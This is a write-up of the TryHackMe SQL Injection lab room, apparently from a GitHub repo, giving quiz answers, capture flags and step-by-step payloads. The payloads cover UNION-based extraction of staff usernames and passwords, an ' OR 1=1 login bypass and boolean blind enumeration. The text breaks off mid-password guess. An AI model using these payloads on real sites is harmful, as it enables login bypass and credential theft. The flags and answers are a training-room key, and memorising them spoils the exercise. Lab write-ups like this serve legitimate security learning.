<h1 align='center'>:fire: TryHackMe SQL Injection room :fire: </h1>

![show image](images/1-show.png)<br/>
[SQL Injection Room](https://tryhackme.com/room/sqlinjectionlm)


## Task 1: Breif
### Q: What does SQL stand for?
![what does](images/2-what-does.png)<br/>
#### A: `Structured Query Language` :heavy_check_mark:<br/>

## Task 2: What is database?
### Q: What is the acronym for the software that controls a database?
![dbms](images/3.png)<br/>
#### A: `DBMS` :heavy_check_mark:<br/>

### Q: What is the name of the grid-like structure which holds the data?
![table](images/4-table.png)<br/>
#### A: `table` :heavy_check_mark:<br/>

## Task 3: What is SQL?
### Q: What SQL statement is used to retrieve data?
![select](images/5-select.png)<br/>
#### A: `SELECT` :heavy_check_mark:<br/>

### Q: What SQL clause can be used to retrieve data from multiple tables?
![union](images/6-union.png)<br/>
#### A: `UNION` :heavy_check_mark:<br/>

### Q: What SQL statement is used to add data?
![insert](images/7-insert.png)<br/>
#### A: `INSERT` :heavy_check_mark:<br/>

## Task 4: What is SQL Injection?
### Q: What character signifies the end of an SQL query?
![semicolon](images/8-semicolon.png)<br/>
#### A: `;` :heavy_check_mark:<br/>

## Task 5: In-Band SQLi
### Q: What is the flag after completing level 1?
    '
![apostrophe](images/9-apostrophe.png)<br/>
Try typing an apostrophe `'` after the `id=1` and press enter. And you'll see this returns an SQL error informing you of an error in your syntax.<br/>

    1 UNION SELECT 1,2,3
![error solved](images/10-error-solved.png)<br/>
Success,  the error message has gone, and the article is being displayed, but now  we want to display our data instead of the article.<br/>

Now change value `1` to `0` before UNION

    0 UNION SELECT 1,2,3
![change value](images/11-change-value.png)<br/>
You'll now see the article is just made up of the result from the UNION select returning the column values `1, 2, and 3`<br/>

    0 UNION SELECT 1,2,database()
![datanase](images/12-database.png)<br/>
It now shows the name of the database, which is `sqli_one`.<br/>

    0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
![tables name](images/13-get-tables-name.png)<br/>
The information we want to retrieve has changed from table_name to `column_name`, the table we are querying in the information_schema database has changed from tables to `columns`, and we're searching for any rows where the `table_name` column has a value of `staff_users`.<br/>

    0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
![columns](images/14-all-columns.png)<br/>
We get all the columns name of `stuff_users` table

    0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
![password](images/15-password.png)<br/>
#### A: `THM{SQL_INJECTION_3840}` :heavy_check_mark:<br/>

## Task 6: Blind SQLi - Authentication Bypass
### Q: What is the flag after completing level two? (and moving to level 3)
    username anything and password field ' OR 1=1;--
![sqli in password](images/16-sqli-in-pwd.png)<br/>
![next button](images/17-click-next.png)<br/>
#### A: `THM{SQL_INJECTION_9581}` :heavy_check_mark:<br/>


## Task 7: Blind SQLi - Boolean Based
### Q: What is the flag after completing level three?
    admin123' UNION SELECT 1;-- 
![incorrent column](images/18-incorrect-column.png)<br/>
As the web application has responded with the value taken as false, we can confirm this is the incorrect value of columns.<br/>

    admin123' UNION SELECT 1,2,3;-- 
![Column error fixed](images/19-column-error-fixed.png)<br/>
Now that our number of columns has been established, we can work on the  enumeration of the database.<br/>

    admin123' UNION SELECT 1,2,3 where database() like 's%';-- 
![Get db name](images/20-get-database-name.png)<br/>
After many tryed i've found full database name, which is `sqli_three`<br/>

Now we need to enumerate `table names` using a similar method.
    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--
![table name](images/21-table-name.png)<br/>

    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
![full table name](images/22-full-table-name.png)<br/>
After many tryed i've found full table name, which is `users`<br/>

    admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME !='%username%'; ---
![column name](images/23-column-name-found.png)<br/>
I've found a column called `username` under the `users` table and database `sql_three`<br/>

    admin123' UNION SELECT 1,2,3 from users where username like 'a%
![username start](images/24-username-start-point.png)<br/>
As you can see username character start with `a`

    admin123' UNION SELECT 1,2,3 from users where username like 'admin%
![username found](images/25-username-found.png)<br/>
I've found username `admin`<br/>

    admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%
![finding password](images/26-finding-password.png)<br/>